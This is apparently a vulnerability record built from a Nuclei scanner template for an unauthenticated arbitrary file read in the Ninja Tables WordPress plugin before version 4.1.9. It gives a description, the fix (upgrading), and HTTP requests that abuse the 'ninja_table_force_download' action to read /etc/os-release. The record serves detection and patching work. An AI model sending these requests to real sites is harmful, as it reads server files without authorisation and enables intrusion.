# Vulnerability: Ninja Tables <4.1.9 - Unauthenticated Arbitrary File Read
**Classification:** NINJA-TABLES
**Source:** Nuclei Template (`wp-ninja-tables-lfi.yaml`)

## Description
The Ninja Tables plugin for WordPress (versions < 4.1.9) is vulnerable to an unauthenticated arbitrary file download vulnerability. The issue exists due to the improper validation of the 'url' parameter in the 'ninja_table_force_download' AJAX action.

## Secure Mitigation
Update the Ninja Tables plugin to version 4.1.9 or later.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /wp-admin/admin-ajax.php?action=ninja_table_force_download&url=/etc/os-release&ninja_table_public_nonce={{public_nonce}} HTTP/1.1
Host: {{Hostname}}
```

